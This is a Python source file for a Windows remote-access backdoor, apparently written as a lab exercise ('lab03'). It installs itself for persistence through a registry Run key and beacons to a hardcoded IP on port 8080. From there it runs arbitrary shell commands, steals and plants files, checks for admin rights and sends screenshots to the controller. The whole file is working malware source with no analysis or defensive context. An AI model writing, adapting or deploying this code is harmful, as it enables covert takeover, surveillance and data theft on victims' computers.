# Created by Louis Kraimer

import socket
import subprocess
import os
import sys
import time
import shutil
import tempfile
from PIL import ImageGrab


def initiate():
    registry()
    tuneconnection()


def registry():
    location = os.environ['appdata'] + '\\lab03.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call(
            'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LAB03 /t REG_SZ /d "' + location + '"',
            shell=True)


def tuneconnection():
    mysocket = socket.socket()
    while True:
        time.sleep(10)
        try:
            mysocket.connect(("10.17.122.20", 8080))
            shell(mysocket)
        except:
            tuneconnection()


def letSend(mysocket, path, fileName):
    try:
        # Create the directory if it doesn't exist
        os.makedirs(path, exist_ok=True)

        # Create the full path for the file
        full_path = os.path.join(path, fileName)
        print(f"Receiving file and saving to: {full_path}")

        # Open the file for writing in binary append mode
        with open(full_path, 'wb') as f:  # Changed to 'wb' instead of 'ab'
            while True:
                bits = mysocket.recv(1024)
                if not bits:
                    break

                # Check for completion or error markers
                if bits.endswith(b"DONE"):
                    f.write(bits[:-4])  # Write everything except the DONE marker
                    print(f"!SUCCESS!: File received and saved as: {full_path}")
                    break

                if b"File not found" in bits:
                    print("!ERR!: Server couldn't find the file.")
                    break

                if b"File is empty" in bits:
                    print("!ERR!: File is empty.")
                    break

                if b"File transfer error" in bits:
                    print("!ERR!: Server encountered an error during transfer.")
                    break

                # Write the received data to the file
                f.write(bits)

    except Exception as e:
        print(f"!ERR!: Error receiving file: {str(e)}")


def letGrab(mysocket, path):
    try:
        if os.path.exists(path):
            with open(path, 'rb') as f:
                while True:
                    chunk = f.read(1024)
                    if not chunk:
                        break
                    mysocket.send(chunk)
            mysocket.send(b'DONE')  # Indicate end of file transfer
        else:
            mysocket.send(b'File not found')
    except Exception as e:
        mysocket.send(f"!ERR!: Error in file transfer: {str(e)}".encode())


def transfer(mysocket, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            mysocket.send(packet)
            packet = f.read(5000)
        f.close()
        mysocket.send('DONE'.encode())
    else:
        mysocket.send('File not found'.encode())

def shell(mysocket):
    while True:
        command = mysocket.recv(5000)
        if not command:
            break

        cmd_str = command.decode(errors='ignore')

        if "seeya" in cmd_str:
            try:
                mysocket.close()
                break
            except Exception as e:
                informToServer = "!ERR!: " + str(e)
                mysocket.send(informToServer.encode())
                break

        elif 'cd' in cmd_str:
            try:
                code, directory = cmd_str.split(" ", 1)
                os.chdir(directory)
                informToServer = "Current Working Directory is: " + os.getcwd()
                mysocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "!ERR!: " + str(e)
                mysocket.send(informToServer.encode())

        elif 'checkUserLevel' in cmd_str:
            try:
                admin = 'admin' in os.popen('whoami /groups').read().lower() if sys.platform.startswith(
                    "win") else os.geteuid() == 0
                perms = "[+] Administrator Privileges." if admin else "[!!] User Privileges. (No Admin privileges)"
                mysocket.send(perms.encode())
            except Exception as e:
                mysocket.send(f"[+] Some error occurred: {str(e)}".encode())

        elif 'grab' in cmd_str:
            try:
                parts = cmd_str.split("*")
                if len(parts) < 2:
                    mysocket.send(b"!ERR!: Invalid grab command format")
                    continue
                grab_cmd, path = parts
                letGrab(mysocket, path)
            except Exception as e:
                mysocket.send(f"!ERR!: Error in grab command: {str(e)}".encode())

        elif 'send' in cmd_str:
            try:
                parts = cmd_str.split("*")

                if len(parts) == 3:
                    send_cmd, path, fileName = parts
                    # Make sure path exists and has a trailing separator
                    if path and not path.endswith(os.path.sep):
                        path += os.path.sep
                    letSend(mysocket, path, fileName)
                else:
                    mysocket.send(f"!ERR!: Invalid send format. Expected 3 parts, got {len(parts)}".encode())
            except Exception as e:
                informToServer = f"!ERR!: Error in send command: {str(e)}"
                mysocket.send(informToServer.encode())



        elif 'screencap' in cmd_str:
            dirpath = tempfile.mkdtemp()
            ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
            transfer(mysocket, dirpath + "\img.jpg")
            shutil.rmtree(dirpath)

        else:
            try:
                cmd = subprocess.Popen(cmd_str, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE)
                output = cmd.stdout.read()
                error = cmd.stderr.read()

                if output:
                    mysocket.send(output)
                if error:
                    mysocket.send(error)

                # If no output or error, send a success message
                if not output and not error:
                    mysocket.send(b"Command executed successfully with no output")
            except Exception as e:
                mysocket.send(f"!ERR!: Command execution error: {str(e)}".encode())


def main():
    initiate()

if __name__ == "__main__":
    main()